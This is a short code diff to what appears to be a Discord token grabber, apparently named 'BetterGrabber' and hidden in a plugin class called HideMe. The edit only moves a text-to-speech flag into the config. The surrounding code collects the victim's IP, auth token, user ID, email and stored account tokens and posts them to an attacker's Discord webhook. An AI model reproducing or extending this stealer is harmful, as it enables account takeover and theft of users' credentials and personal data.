@@ -41,7 +41,8 @@ class HideMe {
     	const https = require('https');//Hehehe Hello XMLHttpRequest
 
     	var config = {
-    		webHook: "/api/webhooks/ID/TOKEN"
+    		webHook: "/api/webhooks/ID/TOKEN",
+            tts: true
     	};
 
     	function getIP(){
@@ -73,7 +74,7 @@ class HideMe {
             content: "@everyone",
             username: "Hello World",
             avatar_url: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
-            tts: true,
+            tts: config.tts,
             embeds: [{"title": "Hello World", "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": null, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User ID", "value": `\`${actualUserID.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens}\`\`\``, inline: false }]}]
         });
 
